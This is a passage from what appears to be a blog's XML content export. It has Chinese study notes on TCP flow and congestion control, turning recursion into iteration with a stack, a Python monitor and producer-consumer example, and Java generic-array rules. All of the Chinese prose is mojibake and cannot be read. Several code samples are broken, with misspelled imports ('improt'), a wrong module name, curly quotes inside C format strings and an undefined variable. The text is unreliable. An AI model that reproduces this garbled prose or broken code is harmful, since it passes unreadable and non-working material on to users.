<h3 id="æµé‡æ§åˆ¶"><a href="#æµé‡æ§åˆ¶" class="headerlink" title="æµé‡æ§åˆ¶"></a>æµé‡æ§åˆ¶</h3><p>æœ¬è´¨ä¸Šï¼Œæµé‡æ§åˆ¶æ˜¯ä¸€ç§<strong>é€Ÿåº¦åŒ¹é…</strong>æœºåˆ¶ã€‚</p>
<p>æ¥æ”¶æ–¹ä¸º TCP è¿æ¥åˆ†é… Bufferï¼š</p>
<p><img src="https://i.loli.net/2020/01/24/sA8wQaBl3V9PjZI.png" alt="æ¥æ”¶æ–¹Buffer"></p>
<p>æ¥æ”¶æ–¹é€šè¿‡åœ¨ Segment å¤´éƒ¨å­—æ®µå°† RcvWindow å‘Šè¯‰å‘é€æ–¹ã€‚å‘é€æ–¹å·²å‘é€ä½†æœªæ¥æ”¶ ACK çš„æ•°æ®é‡ä¸è¶…è¿‡ RcvWindowã€‚</p>
<p>RcvWindow = 0ï¼Œå‘é€æ–¹ä»ç„¶å¯ä»¥å‘é€ä¸€ä¸ªå¾ˆå°çš„æ®µæ¥æ›´æ–° RcvWindow å€¼ã€‚</p>
<h3 id="TCP-è¿æ¥ç®¡ç†"><a href="#TCP-è¿æ¥ç®¡ç†" class="headerlink" title="TCP è¿æ¥ç®¡ç†"></a>TCP è¿æ¥ç®¡ç†</h3><p>ä¸‰æ¬¡æ¡æ‰‹ï¼š</p>
<ol>
<li>å®¢æˆ·ç«¯å‘é€ SYN æŠ¥æ–‡ã€‚</li>
<li>æœåŠ¡å™¨å‘é€ SYN/ACK æŠ¥æ–‡</li>
<li>å®¢æˆ·ç«¯å‘é€ ACK æŠ¥æ–‡ï¼Œæ­¤æ—¶å¯ä»¥åŒ…å«æ•°æ®ã€‚</li>
</ol>
<p><img src="https://i.loli.net/2020/01/24/jKaRhulIT8k9D5A.png" alt="ä¸‰æ¬¡æ¡æ‰‹"></p>
<p>å››æ¬¡æŒ¥æ‰‹ï¼š</p>
<ol>
<li>å®¢æˆ·ç«¯å‘é€ FIN æŠ¥æ–‡</li>
<li>æœåŠ¡å™¨å‘é€ ACKã€‚å‘é€ FIN</li>
<li>å®¢æˆ·ç«¯æ”¶åˆ° FINï¼Œå›å¤ ACKï¼Œè¿›å…¥ç­‰å¾…çŠ¶æ€ï¼ˆç¡®ä¿æœåŠ¡å™¨æ­£ç¡®å…³é—­èµ„æºï¼‰</li>
<li>æœåŠ¡å™¨æ”¶åˆ° ACKï¼Œè¿æ¥å…³é—­</li>
</ol>
<p><img src="https://i.loli.net/2020/01/24/PV2D49ulaBKycgo.png" alt="å››æ¬¡æŒ¥æ‰‹"></p>
<h3 id="æ‹¥å¡æ§åˆ¶"><a href="#æ‹¥å¡æ§åˆ¶" class="headerlink" title="æ‹¥å¡æ§åˆ¶"></a>æ‹¥å¡æ§åˆ¶</h3><p>ä¸æµé‡æ§åˆ¶è€ƒè™‘ç«¯åˆ°ç«¯æ—¶å»¶ä¸åŒï¼Œæ‹¥å¡æ§åˆ¶æ˜¯å‡ºäºé¿å…å‘å‡ºè¿‡å¤šæŠ¥æ–‡å¯¼è‡´ç½‘ç»œæ‹¥å¡çš„è€ƒè™‘ã€‚å¦‚æœè¯´æµé‡æ§åˆ¶æ˜¯å°ä¹˜ä½›æ³•ï¼Œé‚£ä¹ˆæ‹¥å¡æ§åˆ¶å°±æ˜¯å¤§ä¹˜ä½›æ³•ã€‚</p>
<p>ç½‘ç»œå±‚ä¸æ˜¾å¼æä¾›æ‹¥å¡æ§åˆ¶æ”¯æŒï¼Œç«¯ç³»ç»Ÿé€šè¿‡è§‚å¯Ÿä¸¢å¤±ã€æ—¶å»¶ç­‰ç½‘ç»œè¡Œä¸ºåˆ¤æ–­æ˜¯å¦å‘ç”Ÿæ‹¥å¡ã€‚</p>
<h4 id="åŸºæœ¬åŸç†"><a href="#åŸºæœ¬åŸç†" class="headerlink" title="åŸºæœ¬åŸç†"></a>åŸºæœ¬åŸç†</h4><p>å‘é€æ–¹è®¾ç½®ä¸€ä¸ªå˜é‡ CongWinï¼ŒåŠ¨æ€è°ƒæ•´å˜é‡ä»¥æ”¹å˜å‘é€é€Ÿç‡ã€‚ä¿è¯ï¼š</p>
<p>LastByteSend - LastByteAcked &lt;= CongWin</p>
<p>rate = CongWin/RTT</p>
<h4 id="å¦‚ä½•æ„ŸçŸ¥ç½‘ç»œæ‹¥å¡"><a href="#å¦‚ä½•æ„ŸçŸ¥ç½‘ç»œæ‹¥å¡" class="headerlink" title="å¦‚ä½•æ„ŸçŸ¥ç½‘ç»œæ‹¥å¡"></a>å¦‚ä½•æ„ŸçŸ¥ç½‘ç»œæ‹¥å¡</h4><p>å‘ç”Ÿ Loss äº‹ä»¶ï¼ˆè¶…æ—¶æˆ–æ”¶åˆ° 3 ä¸ªé‡å¤ ACKï¼‰åï¼Œå‘é€æ–¹è°ƒæ•´é€Ÿç‡ã€‚</p>
<h4 id="å¦‚ä½•è°ƒæ•´é€Ÿç‡"><a href="#å¦‚ä½•è°ƒæ•´é€Ÿç‡" class="headerlink" title="å¦‚ä½•è°ƒæ•´é€Ÿç‡"></a>å¦‚ä½•è°ƒæ•´é€Ÿç‡</h4><h5 id="åŠ æ€§å¢-ä¹˜æ€§å‡ï¼ˆæ‹¥å¡é¿å…ï¼‰"><a href="#åŠ æ€§å¢-ä¹˜æ€§å‡ï¼ˆæ‹¥å¡é¿å…ï¼‰" class="headerlink" title="åŠ æ€§å¢-ä¹˜æ€§å‡ï¼ˆæ‹¥å¡é¿å…ï¼‰"></a>åŠ æ€§å¢-ä¹˜æ€§å‡ï¼ˆæ‹¥å¡é¿å…ï¼‰</h5><p>é€æ¸å¢åŠ å‘é€é€Ÿç‡ï¼Œç›´åˆ°å‘ç”Ÿ Lossã€‚</p>
<p>æ–¹æ³•ï¼šAIMDï¼ˆAdditive Increaseï¼ŒMutiplicative Decreaseï¼‰ï¼š</p>
<ul>
<li>Additive Increaseï¼šæ¯ä¸ª RTT å°† CongWin å¢å¤§ä¸€ä¸ª MSSï¼ˆMax Segment Sizeï¼‰</li>
<li>Mutiplicative Decreaseï¼šå‘ç”Ÿ Loss åå°† CongWin å‡åŠ</li>
</ul>
<p><img src="https://i.loli.net/2020/01/25/AIB1lpe8UntPEu2.png" alt="AIMD"></p>
<h5 id="æ…¢å¯åŠ¨"><a href="#æ…¢å¯åŠ¨" class="headerlink" title="æ…¢å¯åŠ¨"></a>æ…¢å¯åŠ¨</h5><p>TCP è¿æ¥å»ºç«‹æ—¶ï¼ŒCongWin = 1ã€‚æ­¤é˜¶æ®µå¯ç”¨å¸¦å®½è¿œé«˜äºåˆå§‹é€Ÿç‡ã€‚</p>
<p>åŸç†ï¼šæ¯æ”¶åˆ°ä¸€ä¸ª ACKï¼Œæ‰§è¡Œ CongWin++ï¼ˆæŒ‡æ•°å¢é•¿ï¼Œ<strong>æ¯æ¬¡ç¿»å€</strong>ï¼‰ã€‚è®°å½•ä¸€ä¸ªå˜é‡ Threshold = CongWinSize(Loss)ã€‚CongWinSize è¶…è¿‡ Threshold åç”±æŒ‡æ•°å¢é•¿å˜ä¸ºçº¿æ€§å¢é•¿ã€‚</p>
<p><img src="https://i.loli.net/2020/01/25/Sw6VbWrPgDziBFX.png" alt="æ…¢å¯åŠ¨"></p>
<p>Loss å¤„ç†ï¼š</p>
<ul>
<li>3 ä¸ªé‡å¤ ACKï¼šCongWinSize /= 2ï¼Œç„¶åçº¿æ€§å¢é•¿</li>
<li>Timeoutï¼šCongWinSize = 1ï¼Œç„¶åæŒ‡æ•°å¢é•¿ï¼ˆè¾¾åˆ° Threshold åå†çº¿æ€§å¢é•¿ï¼‰</li>
</ul>
<p><strong>Timeout æ¯”é‡å¤ ACK æ›´ä¸¥é‡ï¼</strong></p>
<ol>
<li>CongWinSize &lt; Thresholdï¼ŒCongWinSize æŒ‡æ•°å¢é•¿</li>
<li>CongWinSize &gt; Thresholdï¼ŒCongWinSize çº¿æ€§å¢é•¿</li>
<li>æ”¶åˆ° 3 ä¸ªé‡å¤ ACKï¼ŒThreshold = CongWinSize / 2ï¼ŒCongWinSize /= 2ï¼ˆThreshold == CongWinSizeï¼‰</li>
<li>å‘ç”Ÿ Timeoutï¼ŒThreshold = CongWinSize / 2ï¼ŒCongWinSize = 1</li>
</ol>
]]></content>
      <categories>
        <category>è®¡ç®—æœºç½‘ç»œ</category>
      </categories>
      <tags>
        <tag>ä¼ è¾“å±‚</tag>
      </tags>
  </entry>
  <entry>
    <title>é€’å½’ã€è¿­ä»£ä¸å›æº¯</title>
    <url>/2020/01/19/%E9%80%92%E5%BD%92%E3%80%81%E8%BF%AD%E4%BB%A3%E4%B8%8E%E5%9B%9E%E6%BA%AF/</url>
    <content><![CDATA[<h1 id="é€’å½’ã€è¿­ä»£ä¸å›æº¯"><a href="#é€’å½’ã€è¿­ä»£ä¸å›æº¯" class="headerlink" title="é€’å½’ã€è¿­ä»£ä¸å›æº¯"></a>é€’å½’ã€è¿­ä»£ä¸å›æº¯</h1><h2 id="é€’å½’"><a href="#é€’å½’" class="headerlink" title="é€’å½’"></a>é€’å½’</h2><p>é€’å½’æ˜¯ç¨‹åºæ‰§è¡Œè¿‡ç¨‹å‡½æ•°è°ƒç”¨è‡ªå·±ä¸æ–­å‹æ ˆçš„è¿‡ç¨‹ï¼Œå°†ä¸€ä¸ªå¤§é—®é¢˜åˆ†è§£ä¸ºè‹¥å¹²ä¸ªæ€§è´¨ç›¸ä¼¼çš„å°é—®é¢˜ã€‚ä¸€ä¸ªé€’å½’æ¨¡å‹å¿…é¡»åŒ…å«ä¸¤éƒ¨åˆ†ï¼š <strong>é€’å½’ä½“</strong> å’Œ <strong>é€’å½’å‡ºå£</strong> ã€‚ä»¥æ±‚è§£æ–æ³¢é‚£å¥‘æ•°åˆ—ä¸ºä¾‹ï¼Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fib</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> <span class="keyword">or</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> n  <span class="comment"># é€’å½’å‡ºå£</span></span><br><span class="line">    <span class="keyword">return</span> Fib(n-<span class="number">1</span>) + Fib(n-<span class="number">2</span>)  <span class="comment"># é€’å½’ä½“</span></span><br></pre></td></tr></table></figure>

<h2 id="è¿­ä»£"><a href="#è¿­ä»£" class="headerlink" title="è¿­ä»£"></a>è¿­ä»£</h2><p>é€’å½’æ·±åº¦è¿‡å¤§ä¼šå¯¼è‡´æµªè´¹ç³»ç»Ÿèµ„æºï¼ŒåŒæ—¶æ‹–æ…¢ç¨‹åºè¿è¡Œé€Ÿåº¦ã€‚æ‰€ä»¥ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦æŠŠé€’å½’è§£æ³•è½¬åŒ–ä¸ºéé€’å½’ã€‚</p>
<p>å¯¹äºä¸éœ€è¦å›æº¯çš„é—®é¢˜ï¼Œå¯ç”¨ç›´æ¥è½¬æ¢æ³•ï¼Œç”¨ä¸­é—´å˜é‡æ¥ä¿å­˜ä¸­é—´ç»“æœã€‚è¿™ç§æ–¹æ³•åœ¨ <strong>å°¾é€’å½’</strong> æˆ– <strong>å•å‘é€’å½’</strong> ä¸­å¾ˆå¸¸è§ï¼Œè¿˜æ˜¯ä»¥æ–æ³¢é‚£å¥‘æ•°åˆ—ä¸ºä¾‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fib</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">1</span>:</span><br><span class="line">        result = i + j  <span class="comment"># ç”¨ä¸­é—´å˜é‡ä¿å­˜è¿­ä»£ç»“æœ</span></span><br><span class="line">        i = j</span><br><span class="line">        j = result</span><br><span class="line">        n -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<h2 id="å›æº¯"><a href="#å›æº¯" class="headerlink" title="å›æº¯"></a>å›æº¯</h2><p>å¯¹äºä¸èƒ½ç›´æ¥æ±‚å€¼ï¼Œéœ€è¦å›æº¯çš„é—®é¢˜ï¼Œåˆ©ç”¨æ ˆä¿å­˜ä¸­é—´ç»“æœã€‚ä¾‹å¦‚ä¸‹é¢è¿™ä¸ªé€†åºè¾“å‡ºç”¨æˆ·è¾“å…¥çš„å‡½æ•°ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> sum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">scanf</span>(â€œ%dâ€, &amp;x);</span><br><span class="line">    <span class="keyword">if</span> (!x) sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> test(sum);</span><br><span class="line">    sum += x;</span><br><span class="line">    <span class="built_in">printf</span>(â€œ%dâ€, um);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯è§è¿™ä¸ªå‡½æ•°ä¸æ˜¯ç®€å•çš„å•å‘é€’å½’ï¼Œåœ¨é€’å½’ç»“æŸåè¿˜è¦æ‰§è¡Œä¸€äº›æ“ä½œã€‚è¿™å°±å¿…é¡»ç”¨æ ˆæ¥æ¶ˆå»é€’å½’ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ditui</span><span class="params">(<span class="keyword">int</span> sum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Stack S;</span><br><span class="line">    StackInitiate(&amp;S);</span><br><span class="line">    <span class="keyword">int</span> x, e;</span><br><span class="line">    <span class="built_in">scanf</span>(â€œ%dâ€, &amp;x) ;</span><br><span class="line">    <span class="keyword">while</span> (x)</span><br><span class="line">    &#123;</span><br><span class="line">        StackPush(&amp;S, x);</span><br><span class="line">        <span class="built_in">scanf</span>(â€œ%dâ€, &amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    sum=<span class="number">0</span>; </span><br><span class="line">    <span class="built_in">printf</span>(â€œ%dâ€, sum);</span><br><span class="line">    <span class="keyword">while</span> (StackNotEmpty(S))</span><br><span class="line">    &#123;</span><br><span class="line">        StackPop(&amp;S, &amp;e);</span><br><span class="line">        sum+=e;</span><br><span class="line">        <span class="built_in">printf</span>(â€œ%dâ€, sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>æ•°æ®ç»“æ„</category>
      </categories>
      <tags>
        <tag>æŠ€å·§</tag>
      </tags>
  </entry>
  <entry>
    <title>ç®¡ç¨‹</title>
    <url>/2019/10/13/%E7%AE%A1%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="ç®¡ç¨‹"><a href="#ç®¡ç¨‹" class="headerlink" title="ç®¡ç¨‹"></a>ç®¡ç¨‹</h1><p>ç®¡ç¨‹æ˜¯ä¸€ç§æŠ½è±¡æ¦‚å¿µï¼Œå°è£…äº†ä¸€ä¸ªé”ã€å‡ ä¸ªæ¡ä»¶å˜é‡å’Œå…±äº«èµ„æºã€‚é”ä¿è¯äº†æŸä¸ªæ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½è¿›å…¥ç®¡ç¨‹ï¼Œè€Œæ¡ä»¶å˜é‡ç”¨æ¥æ§åˆ¶å…±äº«èµ„æºã€‚</p>
<h2 id="æ¡ä»¶å˜é‡"><a href="#æ¡ä»¶å˜é‡" class="headerlink" title="æ¡ä»¶å˜é‡"></a>æ¡ä»¶å˜é‡</h2><p>æ¯ä¸ªæ¡ä»¶å˜é‡è¡¨ç¤ºä¸€ç§ç­‰å¾…åŸå› ï¼Œå¯¹åº”ä¸€ä¸ªé˜Ÿåˆ—ï¼Œå½“è¿›ç¨‹ç”±äºå…±äº«èµ„æºè¢«å ç”¨è¿›å…¥ç­‰å¾…çŠ¶æ€æ—¶ï¼Œæˆ‘ä»¬ç§°å…¶ <code>æŒ‚åœ¨</code> æŸä¸ªæ¡ä»¶å˜é‡ä¸Šã€‚</p>
<p>æ¡ä»¶å˜é‡æœ‰ä¸€ä¸ª wait æ–¹æ³•å’Œä¸€ä¸ª signal æ–¹æ³•ã€‚wait æ–¹æ³•é‡Šæ”¾å½“å‰çº¿ç¨‹è¿›å…¥ç®¡ç¨‹æ—¶è·å¾—çš„é”ç„¶åé˜»å¡å®ƒã€‚å¦‚æœæœ‰çº¿ç¨‹æŒ‚åœ¨è¿™ä¸ªæ¡ä»¶å˜é‡ä¸Šï¼Œsignal æ–¹æ³•ä¼šé‡Šæ”¾ä¸€ä¸ªé˜Ÿåˆ—ä¸­çš„çº¿ç¨‹ï¼Œå¦åˆ™ signal å°±æ˜¯ä¸€ä¸ªç©ºæ“ä½œã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading improt Event, get_ident</span><br><span class="line"><span class="keyword">from</span> Collections improt deque</span><br><span class="line"></span><br><span class="line">event = Event()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Condition</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.waitting_value = <span class="number">0</span>  <span class="comment"># æŒ‚åœ¨è¿™ä¸ªæ¡ä»¶å˜é‡ä¸Šçš„çº¿ç¨‹æ•°ç›®</span></span><br><span class="line">        self.queue = deque</span><br><span class="line">        <span class="keyword">global</span> event</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wait</span>(<span class="params">self, lock</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        æŠŠå½“å‰çº¿ç¨‹æŒ‚åœ¨è¿™ä¸ªæ¡ä»¶å˜é‡ä¸Š</span></span><br><span class="line"><span class="string">        :param lock: ç®¡ç¨‹çš„é”ã€‚åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½è·å¾—ç®¡ç¨‹å†…çš„èµ„æº</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.waitting_value += <span class="number">1</span></span><br><span class="line">        self.queue.append(get_ident())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Now we are in the thread: &#123;&#125;, executing wait()&quot;</span>.<span class="built_in">format</span>(get_ident()))</span><br><span class="line">        lock.release()  <span class="comment"># é‡Šæ”¾å½“å‰çº¿ç¨‹çš„lockï¼Œè®©åˆ«çš„çº¿ç¨‹æœ‰æœºä¼šè¢«æ‰§è¡Œ</span></span><br><span class="line">        event.wait()  <span class="comment"># é˜»å¡å½“å‰çº¿ç¨‹</span></span><br><span class="line">        lock.acquire()  <span class="comment"># è¯·æ±‚å†æ¬¡è¿›å…¥ç®¡ç¨‹</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">signal</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        å¦‚æœæœ‰çº¿ç¨‹æŒ‚åœ¨è¿™ä¸ªæ¡ä»¶å˜é‡ä¸Šï¼Œsignal é€‰æ‹©ä¸€ä¸ªå”¤é†’ï¼›å¦‚æœæ²¡æœ‰è¿™å°±æ˜¯ä¸ªç©ºæ“ä½œ</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.waitting_value &gt; <span class="number">0</span>:</span><br><span class="line">            self.queue.popleft()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Now we are in the thread: &#123;&#125;, executing signal()&quot;</span>.<span class="built_in">format</span>(get_ident()))</span><br><span class="line">            event.<span class="built_in">set</span>()  <span class="comment"># å”¤é†’ä¸€ä¸ªçº¿ç¨‹</span></span><br><span class="line">            self.waitting_value -= <span class="number">1</span></span><br><span class="line">            event.clear()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ç”¨ç®¡ç¨‹å®ç°ç”Ÿäº§è€…-æ¶ˆè´¹è€…é—®é¢˜"><a href="#ç”¨ç®¡ç¨‹å®ç°ç”Ÿäº§è€…-æ¶ˆè´¹è€…é—®é¢˜" class="headerlink" title="ç”¨ç®¡ç¨‹å®ç°ç”Ÿäº§è€…-æ¶ˆè´¹è€…é—®é¢˜"></a>ç”¨ç®¡ç¨‹å®ç°ç”Ÿäº§è€…-æ¶ˆè´¹è€…é—®é¢˜</h2><p>é—®é¢˜æè¿°ï¼š</p>
<ul>
<li>ä¸€ä¸ªæˆ–å¤šä¸ªç”Ÿäº§è€…äº§ç”Ÿæ•°æ®åæ”¾åœ¨ç¼“å†²åŒºé‡Œ</li>
<li>å•ä¸ªæ¶ˆè´¹è€…ä»ç¼“å†²åŒºé‡Œå–å‡ºæ•°æ®å¤„ç†</li>
<li>ä»»ä½•æ—¶åˆ»åªæœ‰ä¸€ä¸ªç”Ÿäº§è€…æˆ–æ¶ˆè´¹è€…å¯ä»¥è®¿é—®ç¼“å†²åŒº</li>
</ul>
<p>é—®é¢˜åˆ†æï¼š</p>
<ul>
<li>ä»»ä½•æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹æ“ä½œç¼“å†²åŒºï¼ˆäº’æ–¥è®¿é—®ï¼‰</li>
<li>ç¼“å†²åŒºç©ºæ—¶ï¼Œæ¶ˆè´¹è€…å¿…é¡»ç­‰å¾…ç”Ÿäº§è€…ï¼ˆæ¡ä»¶åŒæ­¥ï¼‰</li>
<li>ç¼“å†²åŒºæ»¡æ—¶ï¼Œç”Ÿäº§è€…å¿…é¡»ç­‰å¾…æ¶ˆè´¹è€…ï¼ˆæ¡ä»¶åŒæ­¥ï¼‰</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock, Event, get_ident, Thread</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">event = Event()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Condition</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.wait_value = <span class="number">0</span>  <span class="comment"># æŒ‚åœ¨è¿™ä¸ªæ¡ä»¶å˜é‡ä¸Šçš„çº¿ç¨‹æ•°ç›®</span></span><br><span class="line">        <span class="keyword">global</span> event</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wait</span>(<span class="params">self, lock</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        æŠŠå½“å‰çº¿ç¨‹æŒ‚åœ¨è¿™ä¸ªæ¡ä»¶å˜é‡ä¸Š</span></span><br><span class="line"><span class="string">        :param lock: ç®¡ç¨‹çš„é”ã€‚åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½è·å¾—ç®¡ç¨‹å†…çš„èµ„æº</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.wait_value += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Now we are in the thread: &#123;&#125;, executing wait()&quot;</span>.<span class="built_in">format</span>(get_ident()))</span><br><span class="line">        lock.release()  <span class="comment"># é‡Šæ”¾å½“å‰çº¿ç¨‹çš„lockï¼Œè®©åˆ«çš„çº¿ç¨‹æœ‰æœºä¼šè¢«æ‰§è¡Œ</span></span><br><span class="line">        event.wait()  <span class="comment"># é˜»å¡å½“å‰çº¿ç¨‹</span></span><br><span class="line">        lock.acquire()  <span class="comment"># è¯·æ±‚å†æ¬¡è¿›å…¥ç®¡ç¨‹</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">signal</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        å¦‚æœæœ‰çº¿ç¨‹æŒ‚åœ¨è¿™ä¸ªæ¡ä»¶å˜é‡ä¸Šï¼Œsignal é€‰æ‹©ä¸€ä¸ªå”¤é†’ï¼›å¦‚æœæ²¡æœ‰è¿™å°±æ˜¯ä¸ªç©ºæ“ä½œ</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.wait_value &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Now we are in the thread: &#123;&#125;, executing signal()&quot;</span>.<span class="built_in">format</span>(get_ident()))</span><br><span class="line">            event.<span class="built_in">set</span>()  <span class="comment"># å”¤é†’ä¸€ä¸ªçº¿ç¨‹</span></span><br><span class="line">            self.wait_value -= <span class="number">1</span></span><br><span class="line">            event.clear()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BoundBuffer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, <span class="built_in">max</span></span>):</span></span><br><span class="line">        self.count = <span class="number">0</span>  <span class="comment"># å…±äº«èµ„æº</span></span><br><span class="line">        self.not_full = Condition()  <span class="comment"># æ¡ä»¶å˜é‡</span></span><br><span class="line">        self.not_empty = Condition()  <span class="comment"># æ¡ä»¶å˜é‡</span></span><br><span class="line">        self.lock = Lock()  <span class="comment"># é”</span></span><br><span class="line">        self.buffer = deque()</span><br><span class="line">        self.<span class="built_in">max</span> = <span class="built_in">max</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deposit</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self.lock.acquire()</span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">while</span> self.count == self.<span class="built_in">max</span>:</span><br><span class="line">                self.not_full.wait(self.lock)</span><br><span class="line">            product = randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">            self.buffer.append(product)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;add &#123;&#125; to the buffer&quot;</span>.<span class="built_in">format</span>(product))</span><br><span class="line">            self.count += <span class="number">1</span></span><br><span class="line">            self.not_empty.signal()</span><br><span class="line">            self.lock.release()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self.lock.acquire()</span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">while</span> self.count == <span class="number">0</span>:</span><br><span class="line">                self.not_empty.wait(self.lock)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;remove &#123;&#125; from the buffer&quot;</span>.<span class="built_in">format</span>(self.buffer.popleft()))</span><br><span class="line">            self.count -= <span class="number">1</span></span><br><span class="line">            self.not_full.signal()</span><br><span class="line">            self.lock.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    model = BoundBuffer(<span class="number">3</span>)</span><br><span class="line">    generator = Thread(target=model.deposit,)</span><br><span class="line">    comsumer = Thread(target=model.remove,)</span><br><span class="line">    generator.start()</span><br><span class="line">    comsumer.start()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>è®¡ç®—æœºç³»ç»Ÿ</category>
      </categories>
      <tags>
        <tag>å¹¶å‘ç¼–ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title>Java ç¦æ­¢åˆ›å»ºæ³›å‹æ•°ç»„</title>
    <url>/2019/01/27/Java%E5%9F%BA%E7%A1%80%E2%80%94%E2%80%94%E6%B3%9B%E5%9E%8B%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<p>java ä¸å…è®¸ç›´æ¥åˆ›å»ºæ³›å‹æ•°ç»„ï¼Œä¹Ÿä¸å…è®¸åˆ›å»ºæ³›å‹å®ä¾‹ã€‚ä¹Ÿå°±æ˜¯è¯´ä¸‹é¢è¿™ç§æƒ…å†µæ˜¯ä¸è¢«å…è®¸çš„ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> T[] a = <span class="keyword">new</span> T[<span class="number">1</span>]; <span class="comment">// error</span></span><br><span class="line">  <span class="keyword">private</span> T t = <span class="keyword">new</span> T(); <span class="comment">// error</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

